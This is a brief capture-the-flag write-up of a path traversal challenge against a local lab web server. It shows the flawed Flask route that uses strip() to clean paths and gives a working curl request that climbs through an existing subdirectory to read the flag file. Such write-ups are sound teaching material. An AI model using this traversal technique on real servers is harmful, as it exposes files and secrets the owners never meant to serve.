# Path Traversal 2

Similar to the previous challenge, you are given a web server `/challenge/server` that serves files from `/challenge/files`.

However, the server attempts to clean the path input by stripping any `.`s before appending to the `request_path`.

```python
@app.route("/content", methods=["GET"])
@app.route("/content/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
```

Python's `strip()` only removes leading and trailing characters specified by the argument in `strip()`.
Therefore, an input like `/dummy/../../../flag` would behave as expected, given that a directory like `/challenge/files/dummy` exists.

Luckily for us, there is a directory called `fortunes` under `files` that allow for this to be passed to the server:

```bash
curl -v 'challenge.localhost:80/content/fortunes/../../../flag' --path-as-is
```

And this gives us the flag!
